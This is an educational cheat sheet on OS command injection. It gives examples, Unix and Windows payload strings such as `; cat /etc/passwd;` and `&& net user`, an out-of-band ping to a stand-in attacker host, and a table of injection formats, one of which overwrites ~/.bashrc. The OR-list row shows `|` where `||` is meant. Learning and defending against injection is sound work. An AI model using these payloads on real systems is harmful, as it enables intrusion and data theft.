	## OS Command Injection

- **What:** The application builds or calls OS shell commands using unsanitized user input. An attacker injects OS commands to be executed on the server. This usually leads to full system compromise.
    
- **Example:** Suppose `GET /ping?host=example.com` runs `ping example.com` on the server. An attacker supplies `host=example.com && whoami`. The app executes `ping example.com && whoami`, returning the `whoami` output. PortSwigger’s example uses `& echo test &` to inject a harmless echo, but any command works similarly.
    
- **Payloads:**
    
    - **Unix-like:** Append `; whoami;`, `&& id`, `; cat /etc/passwd;`, or use `|` to pipe (`| cat /etc/passwd`). For blind injection, `; sleep 5;` delays response or use `ping -c5 attacker.com` for OOB.
        
    - **Windows:** Use `& whoami &`, `&& net user`, `| dir C:\`, or `& ping -n 5 attacker.com`.
        
    - **Command separators:** `;`, `&&`, `||` (Unix); `&`, `&&`, `|` (Windows) allow chaining multiple commands.
        
- **Detection:** Inject a benign command to see output. For example, adding `& echo INJECTION&` should return `INJECTION` if successful. If no output is shown (blind), use delays or redirect output to a file you can fetch.
    
- **Mitigation:** Avoid shelling out with user data. Use language-specific safe APIs (escaped arguments) or validate/whitelist input.

## Some formats for injection

| Shell feature                                                                                     | `USER_INPUT` value        | Resulting shell command                  | Explanation                                                                                                                                       |
| ------------------------------------------------------------------------------------------------- | ------------------------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sequential execution                                                                              | `; malicious_command`     | `/bin/funnytext ; malicious_command`     | Executes `funnytext`, then executes `malicious_command`.                                                                                          |
| [Pipelines](zim://074f796e-e79e-b02c-b290-ac27ad1fecd6.zim/A/Pipeline_\(Unix\) "Pipeline (Unix)") | `\| malicious_command`    | `/bin/funnytext \| malicious_command`    | Sends the output of `funnytext` as input to `malicious_command`.                                                                                  |
| Command substitution                                                                              | `` `malicious_command` `` | `` /bin/funnytext `malicious_command` `` | Sends the output of `malicious_command` as arguments to `funnytext`.                                                                              |
| Command substitution                                                                              | `$(malicious_command)`    | `/bin/funnytext $(malicious_command)`    | Sends the output of `malicious_command` as arguments to `funnytext`.                                                                              |
| AND list                                                                                          | `&& malicious_command`    | `/bin/funnytext && malicious_command`    | Executes `malicious_command` [iff](zim://074f796e-e79e-b02c-b290-ac27ad1fecd6.zim/A/Iff "Iff") `funnytext` returns an exit status of 0 (success). |
| OR list                                                                                           | `\| malicious_command`    | `/bin/funnytext \| malicious_command`    | Executes `malicious_command` [iff](zim://074f796e-e79e-b02c-b290-ac27ad1fecd6.zim/A/Iff "Iff") `funnytext` returns a nonzero exit status (error). |
| Output redirection                                                                                | `> ~/.bashrc`             | `/bin/funnytext > ~/.bashrc`             | Overwrites the contents the `.bashrc` file with the output of `funnytext`.                                                                        |
| Input redirection                                                                                 | `< ~/.bashrc`             | `/bin/funnytext < ~/.bashrc`             | Sends the contents of the `.bashrc` file as input to `funnytext`.                                                                                 |

